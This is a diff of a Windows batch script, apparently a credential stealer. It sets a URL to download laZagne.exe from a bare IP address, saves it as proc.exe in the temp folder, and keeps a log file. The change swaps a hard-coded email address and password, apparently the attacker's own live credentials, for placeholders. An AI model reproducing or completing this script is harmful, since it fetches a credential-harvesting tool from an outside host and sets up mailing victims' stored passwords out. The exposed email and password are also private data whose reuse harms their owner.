@@ -2,8 +2,8 @@
 
 set downloadURL=http://138.197.193.53/laZagne.exe
 
-set email=pkashwin17@gmail.com
-set password=Ashwin123@
+set email=YOURMAILHERE
+set password=YOURPASSHERE
 
 set exeFile=%TEMP%\proc.exe
 set logFile=%TEMP%\proclog.txt
